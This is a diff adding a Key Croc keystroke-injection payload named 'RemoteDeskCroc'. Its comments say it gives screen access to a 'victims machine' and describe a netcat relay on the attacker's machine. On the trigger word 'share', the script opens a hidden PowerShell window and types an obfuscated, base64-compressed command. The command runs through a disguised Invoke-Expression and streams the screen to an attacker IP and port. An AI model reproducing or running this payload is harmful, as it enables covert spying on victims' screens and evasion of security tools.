@@ -1,0 +1,72 @@
+###############################RemoteDeskCroc#####################################
+#	Version 1.0
+# OS: Windows / Linux(?) (Not tested with Powershell on Linux)
+# Author: 0iphor13
+# Discription: This payload will give you screen access to your victims machine. 
+#   Combined with KeyCrocs ability to type in commands, you have basically RemoteDesktop.
+#
+#               !!!!FILL IN IP AND PORT OF ATTACKER MASCHINE IN LINE 34!!!!
+#
+# Setup: Use Netcat on your attacker machine like so - nc lvnp 1234 | nc lvnp 5678 - This will create a relay. (Example Ports)
+#   Use a Browser which supports MJPEG, for example FireFox. URL in Browser - 127.0.0.1:5678 - (Second port you used with nc)
+#   If payload sucessfull, your netcat will catch the stream and do a relay towards your Browser, you have screen access now.
+
+#################Typing "share" will trigger Screenshare##########################
+MATCH share	
+########WAIT_FOR_KEYBOARD_INACTIVITY migt also be a good idea#####################
+
+###############################Change To Your Language############################
+
+export DUCKY_LANG=de
+
+###################Open Powershell Process In The Background######################
+
+Q DELAY 1000
+Q GUI r
+Q DELAY 200
+Q STRING powershell -NoP -NonI -W hidden
+Q DELAY 200
+Q ENTER
+
+###################Obfuscated Powershell Code For ScreenShare#####################
+
+Q DELAY 500
+Q STRING "\$IPADDress='0.0.0.0';\$Port=1234;(NEW-oBjeCt  SySteM.io.coMPreSsIon.deFlAtEStReam( [syStEm.IO.meMoRYsTrEA"
+Q DELAY 300
+Q STRING "m] [sysTeM.coNVeRt]::fRoMbaSE64StRiNG( 'pVdtb9pIEP7eX7HHoUJ02CHtfcopHwhxE5TyIuxrVKHo1tgT7AZ73d2l1EX+7zezBhJiJ+ldk"
+Q DELAY 300
+Q STRING "cBOPK/7zDwzfttubN4Vm26xOSka1l0rDFudluXlGeC11zpiVk8pSObLfOQnwNxcaUjsmzgNxVrZH4RM1Bv26DPbSgzG9hASIXNXS/CTW9bcJE4y5t"
+Q DELAY 300
+Q STRING "PPSk8d3hsW7Iy9feycWXesBQG61fgdwdoaz79gAPUG3xx4pU9z4wre5/eO3plGu+8eTO8slvbR0d70CLTtiuAetNpeWXtW86wXhhKU+uAn8TK/PT0"
+Q DELAY 300
+Q STRING "dpBokCqyFvO+wOo3ySqeJ4mXg9YITKbQIxHIr6gXZUU2Cio/LBO2+SFMIdLu5GWS9i1By4K5bdJqbjIupVxwq363SQMciZS6k4RRUJlIFqKrGPLgu"
+Q DELAY 300
+Q STRING "OnRy3nTAR5dP9DaVEOI7hnouF/37fQwQVkOtapYJnOfcc1zX4SOPQCJTYwzBpsDaz+hgvfCYjxZF1c0uJJSa59rhyuUwQvgt+MqsE1avUB8bfahmT"
+Q DELAY 300
+Q STRING "optRb6ndmCtDGvlBr8y1mCNV1Q6+HPEGhQyu/PjJYRMC9Zgf5h0BKUzxULV4KThRMSprvVXVP57+J/ieQSxjh6B6I55fwuilnRQP4uiQhSv/x+Knx"
+Q DELAY 300
+Q STRING "FFPGsn3aNoTD2P4kzDd207aSDCOF1ggfdUEMf2JejzXIOiaDw5MCC/hjJ3FHed9NdQ3jMDQXwjY4NqZtAlmBHfdj3AZcs8Abg+gl9A+Ar8EGT1KGcp"
+Q DELAY 300
+Q STRING "UobaUkZ5vS2biEqghjCWHFtt4V3VPnS51+PeSvXHPHQIyMa7bpeNrxt1wkM+4EMncvwLRxZnDcLzONLJslb4SusJ/+RMXVQSIxS/8rzJ8Yl90qgIv1"
+Q DELAY 300
+Q STRING "arzc2UO+6Ej1NE3QS5s8WaSvsawxchcMlTBKii3cDq1pBqM9BOWbJa6jjzpT7+biXxdwgtCdnSD+AvNherNPRlfmZZu1syimYrRu2SJt4XZRnRdGll"
+Q DELAY 300
+Q STRING "AkunbE68wc4kysAuxUoytB3cF5SK4yI/85FyqsXxUJZo+M/dOMbaJIPCGATrk7GL3zlRUFkmTGGCVKHNwWQ7oRovFNrvpq51BCwy6gcP7cPeoIzIL3"
+Q DELAY 300
+Q STRING "k0RWnSMfTPcQodqK4j7BTiFY9P/3Ze5SDsZUJz69CwLjkcUYJrC39wVCMtPQzpC+mvkTvs81gnfrafzwebiO0GEiBFfpnIOEEIy7/tc0JUoWyoo4f"
+Q DELAY 300
+Q STRING "5+19UryBeRDWN3txcUhqzJ0FeSj+L4kChuQ9SJIPEXxBXz2tmWHOzIBLOchIsnbbbTxej1pO1CKrnYpio3e10j446rG1XNqtSrdMKtmZesYAsj4Qe/4"
+Q DELAY 300
+Q STRING "D6nO2LGCcQDqC6x0MnEbjocRdLAXDTw8GgP0K60FG7Wyc/Rwn/Gx3QEIa44SmOipw0MZOZKqMMt1EiOIvdFe4QOl/jKX/JYFEzOoztl0L9CHzEL5Eg"
+Q DELAY 300
+Q STRING "zRxLIOHjae6Sf6eXFHYZdZWHcQ7B7Ja495znuNFs1c2Ci+FS9D7m7YmelH5e6xmTlIbPiGQekc7P8JjJ/ZhyfkW8jP+UNZfmpp7PSkaYwtcVKK1qiWnHdb"
+Q DELAY 300
+Q STRING "uRSVuRoSSR7nlvT3e40/JrDl5Rzhj5EtftqpNM7GyWy82eavi1Y0zNOR66+9IMpcrj+IrAc45+SwT7y0Potztet2yriBrC1/gusBfYVAjx5DHRyzSmlG/M"
+Q DELAY 300
+Q STRING "Pnjj4+3CbIMiAR1hXbI1sfFainTxG+tHENzT7kJ0q0B+Q7aOFcPXgCDy50iXPh58LlbMl8BWitRJMhBSIvexTEhtN1glIHNulIJ5Y7IcKQUxtJkUN9Ic3D"
+Q DELAY 300
+Q STRING "8PJ1O8+Rc='), [iO.cOMprEsSIOn.COMPreSSiONMoDE]::DECOmPRESS ) | fOReaCh{NEW-oBjeCt SysTEM.iO.sTREaMREaDEr( \$_, [sYStE"
+Q DELAY 300
+Q STRING "M.tExt.ENcOdInG]::ASCIi )} |FOReAch{\$_.rEADtOEnD()}) | & ((get-vArIaBLe '*mDr*').Name[3,11,2]-Join'')"
+Q DELAY 300
+Q ENTER
